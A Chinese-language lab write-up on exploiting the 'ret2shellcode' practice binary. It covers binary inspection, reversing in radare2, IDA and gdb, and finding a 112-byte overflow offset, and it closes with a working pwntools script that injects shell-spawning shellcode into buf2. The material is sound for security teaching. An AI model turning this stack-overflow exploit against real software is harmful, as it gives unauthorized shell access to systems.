# ret2shellcode
## 執行結果

會自動印出 " No system for you this time !!!"

接著輸入任意字串

就會印出 "bye bye ~"

結束執行

![image](https://user-images.githubusercontent.com/22366572/148738726-f6408add-6f6b-42b3-9624-7afbfea8d595.png)

## 分析步驟
### Step 1 : 獲得檔案的基本資料

指令: ```file [執行檔名]```

![image](https://user-images.githubusercontent.com/22366572/148719601-e694ff03-15c6-41e8-91e0-63f9528e3fc8.png)

可以看到它是在 GNU/Linux 2.6.24 上編譯的，dynamically linked (動態連接的)，ELF 32-bit LSB executable

### Step 2 : 看開啟了哪些保護機制

指令: ```checksec [執行檔名]```

![image](https://user-images.githubusercontent.com/22366572/148719750-61ca71ad-4ce4-4565-ac46-e310794b4f09.png)

可以看到這個執行檔沒有開啟保護機制

### Step 3 : 做逆向工程

1. 使用 radare2 做逆向工程

main逆向指令:
```
r2 ret2shellcode
aa
afl
s main
VV
```
![image](https://user-images.githubusercontent.com/22366572/148738318-e9c4df11-94c9-4fab-a1fe-bc1cd3628721.png)

main 組語:

![image](https://user-images.githubusercontent.com/22366572/148738426-65ea99e6-0861-4f5b-902c-2fadfeef4aec.png)
![image](https://user-images.githubusercontent.com/22366572/148738519-df170b94-4552-46f6-9b29-a91c08774fe8.png)

從上面可以觀察到輸入的字串會儲存在 **buf2** 裡，或許可以在 buf2 裡塞 shellcode 來執行我們想要的指令 

2. 使用 IDA 做逆向工程

將檔案匯入IDA，即可看到組語

![image](https://user-images.githubusercontent.com/22366572/148740280-53add0f9-f2b3-4294-898b-f327affc5f13.png)


### Step 4 : 確認 buf2 是否有可執行能力

指令:
```
gdb ./ret2shellcode
b main                # 給一個breakpoint
r                     # 執行
```

![image](https://user-images.githubusercontent.com/22366572/148740688-47bd3855-3e0f-434c-acf1-a3a8ac6f7b58.png)

![image](https://user-images.githubusercontent.com/22366572/148741213-6a36cef4-3ccf-4132-8934-0d2d05630b25.png)
![image](https://user-images.githubusercontent.com/22366572/148741276-eb742942-e9d4-4bb6-bba5-bab5ba444445.png)

**接著我們要來找 buf2 的位置**

指令:
```
vmmap
```

![image](https://user-images.githubusercontent.com/22366572/148741876-414772bb-c0dc-4824-b5de-e6b9479acb01.png)

因為從上面用 radare2 或是 IDA 分析可以看到，buf2 的位置在 0804a080，所以從上面那張圖可以知道 buf2 的位置在 /home/woowater/Lab3/PWN20210824/ROP/ret2， **且狀態是可讀可寫的**

[Perm] :
  
  ![image](https://user-images.githubusercontent.com/22366572/148756873-dee75647-ace7-4856-84d6-940b6c9a7054.png)

### Step 5 : 找到 return address 的位置
先用 python 產生 120 個隨機的字元 :
```
from pwn import *
cyclic(120)
```
![image](https://user-images.githubusercontent.com/22366572/148826938-5eaf0afc-0787-4573-8c21-7dd49db2dab8.png)

```
# 120字元
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaab
```

開啟 gdb ，啟動 ret2shellcode ，將剛剛產生的 120 個隨機的字元填進去，看看會發生甚麼事:

![image](https://user-images.githubusercontent.com/22366572/148828010-4283f211-f9a5-42f7-b748-2154eddeee8d.png)
![image](https://user-images.githubusercontent.com/22366572/148828102-624465bd-2689-44cc-8b28-fbcc2fb4f5cd.png)

由上圖可看到發生了 Segmentation fault，這是因為在EIP指到的地方發生了 Invalid $PC address。當時跑到 return address 的 EIP 會填進 "daab"，我們希望能將 "daab" 那裡填進我們 shellcode 的位置，這樣當 EIP 跑到 return address 時，就會跳到 shellcode 並執行裡面的程式。對照產生的 120 字元可以知道，在跑到 return address 之前需要填進 **112 個字元**
```
# 開啟python找到指定字元的方法
from pwn import *
cyclic(120)
cyclic_find(b'daab') # find 'daab' location
```

### Step 6 : 撰寫 shellcode，丟進執行程式裡

**Shellcode :**
檔名: exp-ret2shellcode.py
```
from pwn import *
sh = process("./ret2shellcode")
payload = asm(shellcraft.sh())
payload = payload.ljust(112,"a")
buf2_addr = 0x804a080
sh.sendline(payload + p32(buf2_addr))
sh.interactive()
```

